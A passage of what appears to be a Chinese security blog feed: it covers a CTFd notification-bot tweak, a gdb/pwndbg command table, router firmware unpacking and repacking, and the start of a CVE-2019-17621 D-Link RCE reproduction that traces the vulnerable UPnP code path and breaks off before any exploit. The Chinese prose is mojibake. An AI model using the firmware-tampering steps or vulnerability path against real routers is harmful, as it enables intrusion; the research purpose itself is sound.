%&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-text&quot;</span>&gt;</span><br>                Message<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. æ­å–œ%såšå‡ºé¢˜ç›®%sï¼Œé»˜è®¤ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé¢˜ç›®åç§°<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bottext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bottext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bottext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bottext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;botof&quot;</span>&gt;</span><br>                Turn on the Bot<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;botof&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bot&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">0</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">0</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        OFF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">1</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        ON<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-md btn-primary float-right&quot;</span>&gt;</span>Update<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h3><p><img src="/img/article/botv1/image-20221011093547622.png" alt="å‰ç«¯æ•ˆæœ"></p><p>è¿™æ ·å°±å¯ä»¥åœ¨è®¾ç½®é¡µé¢éšæ—¶æ›´æ”¹äº†ï¼Œ <code>Bot Address</code>æ˜¯Botæ¥æ”¶httpè¯·æ±‚çš„åœ°å€ï¼Œ<code>QQ Group Number</code>æ˜¯æœºå™¨äººæ‰€åœ¨çš„qqç¾¤å·ã€‚å¦‚æœæœºå™¨äººè¿è¡Œçš„åœ°å€å‘ç”Ÿå˜åŒ–ï¼Œæˆ–æƒ³æ›´æ”¹å‘æ¶ˆæ¯çš„ç¾¤å·ï¼Œåªéœ€åœ¨è¿™é‡Œæ›´æ”¹å³å¯ï¼Œç›®å‰è¿˜ä¸æ”¯æŒåŒæ—¶å¤šä¸ªç¾¤å‘é€æ¶ˆæ¯ï¼Œå‡†å¤‡ç­‰åˆ°æ·»åŠ ä¸€äºŒä¸‰è¡€åŠŸèƒ½æ—¶ä¸€èµ·æ·»åŠ ã€‚</p><h2 id="åç«¯æ›´æ”¹"><a href="#åç«¯æ›´æ”¹" class="headerlink" title="åç«¯æ›´æ”¹"></a>åç«¯æ›´æ”¹</h2><h3 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h3><p>æ‰“å¼€<code>CTFd/CTFd/views.py</code>ï¼Œæ·»åŠ å‡ ä¸ªå˜é‡ï¼Œç”¨äºæ¥æ”¶htmlé¡µé¢æ•°æ®</p><p><img src="/img/article/botv1/image-20221011092849492.png" alt="view.py"></p><h3 id="challenges-py"><a href="#challenges-py" class="headerlink" title="challenges.py"></a>challenges.py</h3><p>æ‰“å¼€<code>CTFd/CTFD/api/v1/challenges.py</code>ï¼Œåœ¨è§£é¢˜æˆåŠŸåï¼Œè°ƒç”¨æœºå™¨äººAPIå³å¯</p><p><img src="/img/article/botv1/image-20221011093425463.png" alt="challenges.py"></p><h3 id="è¿è¡Œæ¼”ç¤º"><a href="#è¿è¡Œæ¼”ç¤º" class="headerlink" title="è¿è¡Œæ¼”ç¤º"></a>è¿è¡Œæ¼”ç¤º</h3><p><img src="/img/article/botv1/image-20221011094014448.png" alt="æäº¤flag"></p><p><img src="/img/article/botv1/image-20221011094033270.png" alt="ç¾¤æ¶ˆæ¯æˆåŠŸå‘é€"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gdbè°ƒè¯•å¸¸ç”¨æŒ‡ä»¤</title>
    <link href="/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>gdbå¸¸ç”¨è°ƒè¯•æŒ‡ä»¤ï¼ŒåŒ…å«pwngdbã€pwndbgã€pedaã€gefç­‰æ’ä»¶çš„æŒ‡ä»¤</p></blockquote><table><thead><tr><th align="center">å‘½ä»¤åç§°</th><th align="center">å‘½ä»¤ç¼©å†™</th><th align="center">å‘½ä»¤è¯´æ˜</th></tr></thead><tbody><tr><td align="center">run</td><td align="center">r</td><td align="center">è¿è¡Œä¸€ä¸ªå¾…è°ƒè¯•çš„ç¨‹åº</td></tr><tr><td align="center">continue</td><td align="center">c</td><td align="center">è®©æš‚åœçš„ç¨‹åºç»§ç»­è¿è¡Œ</td></tr><tr><td align="center">next</td><td align="center">n</td><td align="center">è¿è¡Œåˆ°ä¸‹ä¸€è¡Œ</td></tr><tr><td align="center">step</td><td align="center">s</td><td align="center">å•æ­¥æ‰§è¡Œï¼Œé‡åˆ°å‡½æ•°ä¼šè¿›å…¥</td></tr><tr><td align="center">until</td><td align="center">u</td><td align="center">è¿è¡Œåˆ°æŒ‡å®šè¡Œåœä¸‹æ¥</td></tr><tr><td align="center">finish</td><td align="center">fi</td><td align="center">ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°ï¼Œå›åˆ°ä¸Šä¸€å±‚è°ƒç”¨å‡½æ•°å¤„</td></tr><tr><td align="center">return</td><td align="center">return</td><td align="center">ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°å¹¶è¿”å›æŒ‡å®šå€¼ï¼Œåˆ°ä¸Šä¸€å±‚å‡½æ•°è°ƒç”¨å¤„</td></tr><tr><td align="center">jump</td><td align="center">j</td><td align="center">å°†å½“å‰ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°æŒ‡å®šè¡Œæˆ–åœ°å€</td></tr><tr><td align="center">print</td><td align="center">p</td><td align="center">æ‰“å°å˜é‡æˆ–å¯„å­˜å™¨å€¼</td></tr><tr><td align="center">backtrace</td><td align="center">bt</td><td align="center">æŸ¥çœ‹å½“å‰çº¿ç¨‹çš„è°ƒç”¨å †æ ˆ</td></tr><tr><td align="center">frame</td><td align="center">f</td><td align="center">åˆ‡æ¢åˆ°å½“å‰è°ƒç”¨çº¿ç¨‹çš„æŒ‡å®šå †æ ˆ</td></tr><tr><td align="center">thread</td><td align="center">thread</td><td align="center">åˆ‡æ¢åˆ°æŒ‡å®šçº¿ç¨‹</td></tr><tr><td align="center">break</td><td align="center">b</td><td align="center">æ·»åŠ æ–­ç‚¹</td></tr><tr><td align="center">tbreak</td><td align="center">tb</td><td align="center">æ·»åŠ ä¸´æ—¶æ–­ç‚¹</td></tr><tr><td align="center">delete</td><td align="center">d</td><td align="center">åˆ é™¤æ–­ç‚¹</td></tr><tr><td align="center">enable</td><td align="center">enable</td><td align="center">å¯ç”¨æŸä¸ªæ–­ç‚¹</td></tr><tr><td align="center">disable</td><td align="center">disable</td><td align="center">ç¦ç”¨æŸä¸ªæ–­ç‚¹</td></tr><tr><td align="center">watch</td><td align="center">watch</td><td align="center">ç›‘è§†æŸä¸€ä¸ªå˜é‡æˆ–å†…å­˜åœ°å€çš„å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–</td></tr><tr><td align="center">list</td><td align="center">list</td><td align="center">æ˜¾ç¤ºæºç </td></tr><tr><td align="center">info</td><td align="center">info</td><td align="center">æŸ¥çœ‹æ–­ç‚¹ &#x2F; çº¿ç¨‹ç­‰ä¿¡æ¯</td></tr><tr><td align="center">ptype</td><td align="center">ptype</td><td align="center">æŸ¥çœ‹å˜é‡ç±»å‹</td></tr><tr><td align="center">disassemble</td><td align="center">disassemble</td><td align="center">æŸ¥çœ‹æ±‡ç¼–ä»£ç </td></tr><tr><td align="center">set args</td><td align="center">set args</td><td align="center">è®¾ç½®ç¨‹åºå¯åŠ¨å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td align="center">show args</td><td align="center">show args</td><td align="center">æŸ¥çœ‹è®¾ç½®çš„å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td align="center">heap â€“simple</td><td align="center">heap -s</td><td align="center">Simply print malloc_chunk structâ€™s contents</td></tr><tr><td align="center">heap â€“verbose</td><td align="center">heap -v</td><td align="center">Print all chunk fields, even unused ones.</td></tr><tr><td align="center">heapinfo</td><td align="center">heapinfo</td><td align="center">è¾“å‡ºfastbinï¼Œtop chunkï¼Œ unsortbinï¼Œtcacheç­‰ä¿¡æ¯</td></tr><tr><td align="center">heapbase</td><td align="center">heapbase</td><td align="center">è·å–heapåŸºå€</td></tr><tr><td align="center">libc</td><td align="center">libc</td><td align="center">è·å–libcåŸºå€</td></tr><tr><td align="center">magic</td><td align="center">magic</td><td align="center">Print useful variable and function in glibc</td></tr><tr><td align="center">at</td><td align="center">at</td><td align="center">Attach by process name</td></tr><tr><td align="center">x&#x2F;20x $addr</td><td align="center">x&#x2F;20x $addr</td><td align="center">æŸ¥çœ‹æŒ‡å®šåœ°å€å†…å®¹</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOTã€‘å›ºä»¶è§£åŒ…åŠæ‰“åŒ…</title>
    <link href="/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/"/>
    <url>/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="è§£åŒ…"><a href="#è§£åŒ…" class="headerlink" title="è§£åŒ…"></a>è§£åŒ…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM file.bin<br></code></pre></td></tr></table></figure><h2 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h2><p>é¦–å…ˆæŸ¥çœ‹åŸ.binæ–‡ä»¶æ–‡ä»¶ç»“æ„</p><p><img src="/img/article/iot-bin/image-20220916182204458-1663326116419-2.png" alt="image-20220916182204458"></p><p>ç„¶ååˆ‡å‰²å‡ºæ–‡ä»¶ç›®å½•ä¹‹å‰çš„å¤´éƒ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=file.bin of=head.bin bs=1 skip=0 count=1376400<br><span class="hljs-comment">#ifæ˜¯åŸå›ºä»¶ï¼Œofæ˜¯è¾“å‡ºæ–‡ä»¶ï¼Œbsæ˜¯å•ä½é•¿åº¦ï¼Œskipæ˜¯åç§»é‡ï¼Œcountæ˜¯åˆ†åŒºå¤§å°å–åˆ°æ–‡ä»¶ç›®å½•ä¹‹å‰</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸è§£åŒ…ï¼Œç„¶åæ›´æ”¹æ–‡ä»¶å†…å®¹ï¼Œéšååˆ¶ä½œæ–‡ä»¶ç›®å½•çš„binæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mksquashfs squashfs-root rootfs.bin -comp xz<br></code></pre></td></tr></table></figure><p>å¤´éƒ¨å’Œæ–‡ä»¶éƒ¨åˆ†è”åˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> header.bin rootfs.bin &gt; pwn.bin<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ ä¸‰ã€‘DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621å¤ç°</title>
    <link href="/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>é“¾æ¥ï¼š<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621#:~:text=%EE%80%80CVE-2019-17621%EE%80%80">CVE - CVE-2019-17621 (mitre.org)</a>. The UPnP endpoint URL %2Fgena.cgi in the,UPnP service when connecting to the local network.)</p><p>The UPnP endpoint URL &#x2F;gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.</p></blockquote><p>ä»¥ä¸Šæ˜¯å®˜ç½‘çš„æè¿°ï¼Œæˆ‘è‡ªå·±ç²—ç•¥çš„ç¿»è¯‘ä¸‹ï¼š</p><blockquote><p>D-Link DIR-859 Wi-Fiè·¯ç”±å™¨çš„1.05ä¸1.06B01 Beta01ç‰ˆå›ºä»¶ä¸­UPnPçš„gena.cgiï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…ï¼Œåœ¨è¿æ¥åˆ°æœ¬åœ°ç½‘ç»œæ—¶ï¼Œé€šè¿‡å‘UPnPå‘é€ç‰¹å®šçš„HTTP SUBSCRIBEè¯·æ±‚ï¼Œä»è€Œå®ç°ä»¥rootèº«ä»½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><h2 id="UPnPä»‹ç»"><a href="#UPnPä»‹ç»" class="headerlink" title="UPnPä»‹ç»"></a>UPnPä»‹ç»</h2><p>åœ¨åˆ†æå‰æˆ‘ä»¬é¦–å…ˆè¦äº†è§£,ä»€ä¹ˆæ˜¯<strong>UPnP</strong></p><p>æˆ‘ä»¬è¯´çš„<strong>UPnPï¼ˆUniversal Plug and Playï¼‰</strong>å³é€šç”¨å³æ’å³ç”¨åè®®ï¼Œå…¶ä½œç”¨gena.cgiç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥å½“æˆ‘ä»¬æ”¯æŒUNPNåè®®çš„è®¾å¤‡å¼€å¯è¯¥åè®®ï¼Œå½“ä¸»æœºæˆ–ä¸»æœºä¸Šçš„åº”ç”¨ç¨‹åºå‘è¯¥è®¾å¤‡å‘å‡ºç«¯å£æ˜ å°„è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬çš„è®¾å¤‡å°±ä¼šè‡ªåŠ¨ä¸ºä¸»æœºåˆ†é…ç«¯å£å¹¶è¿›è¡Œç«¯å£æ˜ å°„ï¼Œè¯¥åè®®ä¹Ÿæ˜¯ä»PNPåè®®é‡Œå¼•ç”³å‡ºæ¥çš„</p><p>è¿™é‡Œæˆ‘ä¹Ÿè¯´ä¸€ä¸‹ä¼ ç»Ÿä½¿ç”¨åè®®çš„PNPåè®®ï¼Œå³ â€œå³æ’å³ç”¨â€ï¼Œè¯¥åè®®æ”¯æŒè‡ªåŠ¨ä¸ºæ–°æ·»åŠ çš„ç¡¬ä»¶åˆ†é…ä¸­æ–­å’Œ I&#x2F;O ç«¯å£ï¼Œç”¨æˆ·æ— é¡»å†åšæ‰‹å·¥è·³çº¿ï¼Œä¹Ÿä¸å¿…ä½¿ç”¨è½¯ä»¶é…ç½®ç¨‹åºã€‚</p><p>è€Œæ‰€è°“åšæ‰‹å·¥è·³çº¿ï¼Œæˆ‘ä»¬å°±ä¸å¾—ä¸è¯´æœ€åŸå§‹çš„æ·»åŠ è®¾å¤‡çš„æ–¹æ³•äº†ï¼Œåœ¨è¿™ä¸¤ç§åè®®å‡ºç°ä¹‹å‰ï¼Œå¦‚æœæˆ‘ä»¬æ–°æ·»åŠ äº†ç¡¬ä»¶ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¸ºæ–°åŠ çš„ç¡¬ä»¶è®¾ç½®ç»ˆç«¯å’ŒI&#x2F;Oç«¯å£ï¼Œæˆ‘ä»¬æ‰€è¯´çš„æ‰‹å·¥è·³çº¿ï¼Œå°±æ˜¯æˆ‘ä»¬æ–°åŠ ç¡¬ä»¶ä¹‹åå°±è¦åœ¨ç›¸åº”çš„é’ˆè„šä¸Šç”¨å°è·³çº¿æ’ä¸€ä¸‹ï¼Œè¿™å¯¹ç”¨æˆ·çš„è¦æ±‚ååˆ†çš„é«˜ï¼Œæ•ˆç‡ä¹Ÿååˆ†ä½ä¸‹ã€‚</p><p>å…³äº<strong>UPnP</strong>è¿™é‡Œå°±ä¸è¯¦è¿°å•¦ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹æ­£å¼çš„åˆ†æ</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆæˆ‘ä»¬å°†å›ºä»¶ä¸‹è½½ä¸‹æ¥ï¼š<a href="https://github.com/Loora1N/IOT-Frimware/tree/main/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6/DIR822A1">DIR822A1_FW103WWb03_(github.com)</a></p><p>åˆ©ç”¨binwalkå°†<code>.bin</code>æ–‡ä»¶åˆ†è§£ï¼Œä»¥è·å–å…¶ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM DIR822A1_FW103WWb03.bin<br></code></pre></td></tr></table></figure><p>è¿›å…¥rootæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç›®å½•ç»“æ„</p><p><img src="/img/article/iot-3/image-20220916150517246.png" alt="image-20220916150517246"></p><p>è¿›å…¥<code>htdocs</code>ç›®å½•ï¼Œæ‰¾åˆ°<code>cgibin</code>ï¼Œåˆ©ç”¨IDA PROå¯¹å…¶è¿›è¡Œé€†å‘åˆ†æ, å¹¶æœç´¢<code>gena.cgi</code></p><p><img src="/img/article/iot-3/image-20220916152135019.png" alt="image-20220916152135019"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>genacgi_main()</code>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="/img/article/iot-3/image-20220916152713992.png" alt="image-20220916152713992"></p><p>å¯ä»¥å‘ç°ï¼Œå¦‚æœè¯·æ±‚æ–¹å¼æ˜¯<code>SUBSCRIBE</code>ï¼Œä¼šè¿›å…¥<code>sub_40FCE0</code>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="/img/article/iot-3/image-20220916153633146.png" alt="image-20220916153633146"></p><p>å‘ç°è°ƒç”¨<code>xmldbc_ephp</code>å‡½æ•°</p><p><img src="/img/article/iot-3/image-20220916154509242.png" alt="image-20220916154509242"></p><p>å…¶ä¸­a3æ˜¯ä¼ å…¥çš„æŠ¥æ–‡ï¼Œç»§ç»­ä¸æ–­è·Ÿè¿›ï¼Œæœ€åæˆ‘ä»¬åœ¨<code>sub_41484C</code>ä¸­ï¼Œçœ‹åˆ°æŠ¥æ–‡è¢«å‘é€ï¼Œè¿™é‡Œçš„<code>a2</code>ä¾¿æ˜¯æŠ¥æ–‡</p><p><img src="/img/article/iot-3/image-20220916155952769.png" alt="image-20220916155952769"></p><p>ç”±å‰é¢çš„æŠ¥æ–‡å†…å®¹å¯çŸ¥ï¼Œå…¶è¢«ä¼ å…¥äº†<code>run.NOTIFY.php</code>ã€‚</p><p><img src="/img/article/iot-3/image-20220916160304794.png" alt="image-20220916160304794"></p><p>åœ¨æ–‡ä»¶ç»“æ„å†…æœç´¢<code>run.NOTIFY.php</code>ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€‚</p><p><img src="/img/article/iot-3/image-20220916160413527.png" alt="image-20220916160413527"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/phplib/upnp/xnode.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gvar.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gena.php&quot;</span>;<br><br><span class="hljs-variable">$gena_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-variable">$G_GENA_NODEBASE</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$INF_UID</span>, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$gena_path</span> = <span class="hljs-variable">$gena_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$SERVICE</span>;<br><span class="hljs-title function_ invoke__">GENA_subscribe_cleanup</span>(<span class="hljs-variable">$gena_path</span>);<br><br><span class="hljs-comment">/* IGD services */</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;L3Forwarding1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.Layer3Forwarding.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;OSInfo1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.OSInfo.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANCommonIFC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANEthLinkC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANIPConn1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANIPConnection.1.php&quot;</span>;<br><span class="hljs-comment">/* WFA services */</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WFAWLANConfig1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WFAWLANConfig.1.php&quot;</span>;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;SUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$SID</span> == <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-title function_ invoke__">GENA_subscribe_new</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$HOST</span>, <span class="hljs-variable">$REMOTE</span>, <span class="hljs-variable">$URI</span>, <span class="hljs-variable">$TIMEOUT</span>, <span class="hljs-variable">$SHELL_FILE</span>, <span class="hljs-string">&quot;/htdocs/upnp/&quot;</span>.<span class="hljs-variable">$php</span>, <span class="hljs-variable">$INF_UID</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-title function_ invoke__">GENA_subscribe_sid</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>,  <span class="hljs-variable">$TIMEOUT</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;UNSUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">GENA_unsubscribe</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“æ–¹æ³•ä¸º<strong>SUBSCRIBE</strong>æ—¶ä¼šè°ƒç”¨<code>GENA_subscribe_new</code>ï¼Œåˆ©ç”¨<code>vscode</code>æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹<code>GENA_subscribe_new</code>å‡½æ•°å®šä¹‰,å¹¶äº†è§£å…¶å®šä¹‰åœ¨<code>gena.php</code>å†…</p><p><img src="/img/article/iot-3/image-20220916161121953.png" alt="image-20220916161121953"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 